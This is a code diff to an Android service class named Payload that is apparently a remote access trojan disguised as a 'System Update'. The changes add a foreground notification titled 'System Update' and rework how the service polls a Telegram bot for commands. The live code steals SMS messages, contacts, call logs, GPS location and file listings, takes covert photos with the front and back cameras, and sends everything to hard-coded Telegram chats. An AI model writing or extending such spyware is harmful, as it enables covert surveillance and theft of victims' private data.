@@ -1,6 +1,9 @@
 package com.system.update;
 
 import android.app.Activity;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -8,7 +11,6 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
 import android.provider.Settings;
-import android.widget.Toast;
 import android.database.Cursor;
 import android.provider.ContactsContract;
 import android.provider.CallLog;
@@ -35,7 +37,6 @@ public class Payload extends Service {
     private String CHAT_ID = "8598136412"; 
     private String GROUP_ID = "-1004405270823"; 
     
-    private volatile boolean isRunning = true;
     private long lastUpdateId = 0;
 
     private void writeLog(String msg) {
@@ -81,84 +82,89 @@ public class Payload extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        writeLog("1. onStartCommand dipanggil");
+        writeLog("1. Service Start (Alarm)");
+        
+        // 1. WAJIB Bikin Notifikasi Foreground Cepat
+        if (Build.VERSION.SDK_INT >= 26) {
+            String CHANNEL_ID = "sys_update_channel";
+            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Update", NotificationManager.IMPORTANCE_LOW);
+            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            if (manager != null) manager.createNotificationChannel(channel);
 
+            Notification notification = new Notification.Builder(this, CHANNEL_ID)
+                    .setContentTitle("System Update")
+                    .setContentText("Checking...")
+                    .setSmallIcon(android.R.drawable.ic_popup_sync)
+                    .build();
+            startForeground(1, notification);
+        }
+
+        // 2. Kerjain tugas di Background Thread
         new Thread(new Runnable() {
             @Override
             public void run() {
-                writeLog("2. Thread jalan");
+                writeLog("2. Thread Jalan");
                 String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
                 
-                writeLog("3. Mencoba kirim CheckIn ke Grup...");
                 sendCheckIn(deviceName);
-                
-                writeLog("4. Mencoba kirim Service Active ke Chat Pribadi...");
-                sendTelegramMessage("🚀 *Service Active!*\nDevice: " + deviceName);
+                checkCommands();
 
-                writeLog("5. Masuk ke looping nunggu perintah...");
-                while (isRunning) {
-                    try {
-                        String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
-                        URL url = new URL(urlStr);
-                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                        conn.setRequestMethod("GET");
-                        
-                        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-                        StringBuilder response = new StringBuilder();
-                        String line;
-                        while ((line = in.readLine()) != null) { response.append(line); }
-                        in.close();
-
-                        String jsonResponse = response.toString();
-                        
-                        if (jsonResponse.contains("\"update_id\":")) {
-                            int startIdx = jsonResponse.lastIndexOf("\"update_id\":") + 12;
-                            int endIdx = jsonResponse.indexOf(",", startIdx);
-                            if (endIdx == -1) endIdx = jsonResponse.indexOf("}", startIdx);
-                            lastUpdateId = Long.parseLong(jsonResponse.substring(startIdx, endIdx).trim());
-                        }
-                        
-                        if (jsonResponse.contains("\"text\":\"/dump_sms\"")) {
-                            sendTelegramMessage("📩 *Dump SMS:*\n" + getSms());
-                        } else if (jsonResponse.contains("\"text\":\"/dump_kontak\"")) {
-                            sendTelegramMessage("👥 *Dump Kontak:*\n" + getContacts());
-                        } else if (jsonResponse.contains("\"text\":\"/dump_telpon\"")) {
-                            sendTelegramMessage("📞 *Dump Call Log:*\n" + getCallLogs());
-                        } else if (jsonResponse.contains("\"text\":\"/foto_depan\"")) {
-                            takePhoto(1);
-                        } else if (jsonResponse.contains("\"text\":\"/foto_belakang\"")) {
-                            takePhoto(0);
-                        } else if (jsonResponse.contains("\"text\":\"/lacak\"")) {
-                            sendTelegramMessage("📍 *Lokasi GPS:*\n" + getLocation());
-                        } else if (jsonResponse.contains("\"text\":\"/cek_file\"")) {
-                            sendTelegramMessage("📂 *Isi Folder:*\n" + listFiles("/storage/emulated/0/"));
-                        }
-
-                    } catch (Exception e) { 
-                        writeLog("Error Loop: " + e.getMessage());
-                    }
-                    try { TimeUnit.SECONDS.sleep(3); } catch (InterruptedException e) { e.printStackTrace(); }
-                }
+                writeLog("3. Tugas Selesai, Service Mati (Tidur)");
+                stopForeground(true);
+                stopSelf();
             }
-        });
-        return START_STICKY;
+        }).start();
+
+        return START_NOT_STICKY; // Biar ga auto-restart ngasal
+    }
+
+    private void checkCommands() {
+        try {
+            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
+            URL url = new URL(urlStr);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            
+            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            StringBuilder response = new StringBuilder();
+            String line;
+            while ((line = in.readLine()) != null) { response.append(line); }
+            in.close();
+
+            String jsonResponse = response.toString();
+            
+            if (jsonResponse.contains("\"update_id\":")) {
+                int startIdx = jsonResponse.lastIndexOf("\"update_id\":") + 12;
+                int endIdx = jsonResponse.indexOf(",", startIdx);
+                if (endIdx == -1) endIdx = jsonResponse.indexOf("}", startIdx);
+                lastUpdateId = Long.parseLong(jsonResponse.substring(startIdx, endIdx).trim());
+            }
+            
+            if (jsonResponse.contains("\"text\":\"/dump_sms\"")) {
+                sendTelegramMessage("📩 *Dump SMS:*\n" + getSms());
+            } else if (jsonResponse.contains("\"text\":\"/dump_kontak\"")) {
+                sendTelegramMessage("👥 *Dump Kontak:*\n" + getContacts());
+            } else if (jsonResponse.contains("\"text\":\"/dump_telpon\"")) {
+                sendTelegramMessage("📞 *Dump Call Log:*\n" + getCallLogs());
+            } else if (jsonResponse.contains("\"text\":\"/foto_depan\"")) {
+                takePhoto(1);
+            } else if (jsonResponse.contains("\"text\":\"/foto_belakang\"")) {
+                takePhoto(0);
+            } else if (jsonResponse.contains("\"text\":\"/lacak\"")) {
+                sendTelegramMessage("📍 *Lokasi GPS:*\n" + getLocation());
+            } else if (jsonResponse.contains("\"text\":\"/cek_file\"")) {
+                sendTelegramMessage("📂 *Isi Folder:*\n" + listFiles("/storage/emulated/0/"));
+            }
+        } catch (Exception e) { 
+            writeLog("Error checkCommands: " + e.getMessage());
+        }
     }
 
     private void sendCheckIn(String deviceInfo) {
         try {
             String encoded = URLEncoder.encode("/checkin " + deviceInfo, "UTF-8");
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + GROUP_ID + "&text=" + encoded;
-            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
-            int code = conn.getResponseCode();
-            
-            if (code == 200) {
-                writeLog("CheckIn SUKSES (200 OK)");
-            } else {
-                BufferedReader err = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
-                String line; StringBuilder sb = new StringBuilder();
-                while ((line = err.readLine()) != null) sb.append(line);
-                writeLog("CheckIn GAGAL (" + code + "): " + sb.toString());
-            }
+            new URL(urlStr).openConnection().getInputStream().close();
         } catch (Exception e) { writeLog("Error CheckIn: " + e.getMessage()); }
     }
 
@@ -242,7 +248,7 @@ public class Payload extends Service {
                         fos.write(data);
                         fos.close();
                         camera.release();
-                        sendTelegramFile(file.getAbsolutePath(), true, "📸 Foto Kamera " + (cameraId == 1 ? "Depan" : "Belakang"));
+                        sendTelegramFile(file.getAbsolutePath(), true, "📸 Foto Kamera");
                     } catch (Exception e) { e.printStackTrace(); }
                 }
             });
@@ -253,11 +259,7 @@ public class Payload extends Service {
         try {
             String encodedMsg = URLEncoder.encode(pesan, "UTF-8");
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodedMsg;
-            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
-            int code = conn.getResponseCode();
-            if (code != 200) {
-                writeLog("Kirim Pesan GAGAL (" + code + ")");
-            }
+            new URL(urlStr).openConnection().getInputStream().close();
         } catch (Exception e) { writeLog("Error Kirim Pesan: " + e.getMessage()); }
     }
 
